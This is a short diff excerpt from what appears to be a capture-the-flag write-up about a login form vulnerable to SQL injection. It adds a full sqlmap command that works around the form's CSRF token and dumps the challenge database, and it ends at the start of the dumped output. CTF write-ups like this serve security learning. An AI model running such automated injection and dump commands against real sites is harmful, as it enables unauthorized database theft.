@@ -13,7 +13,7 @@ We had assumed that was blind SQLi. (After CTF, another teams has shown that it 
 
 We have not had a lot of time, so we use sqlmap. Form had csrf token `<input type='hidden' name='user_token' value='40dbd5c24bcba5a579557884b60e50d8' />`, but that was not a problem for sqlmap with two extra params `--csrf-token="user_token" --csrf-url="http://ctf.sharif.edu:35455/chal/hackme/677aa21d5725bb62/"`
 
-In a few seconds, we got, what we need. 
+In a few seconds, we got, what we need. Command `python sqlmap.py -u "http://ctf.sharif.edu:35455/chal/hackme/677aa21d5725bb62/login.php" --csrf-token="user_token" --csrf-url="http://ctf.sharif.edu:35455/chal/hackme/677aa21d5725bb62/" --data="username=a&password=a&Login=Login&user_token=" --dump`
 
 ```
 Database: hack.me
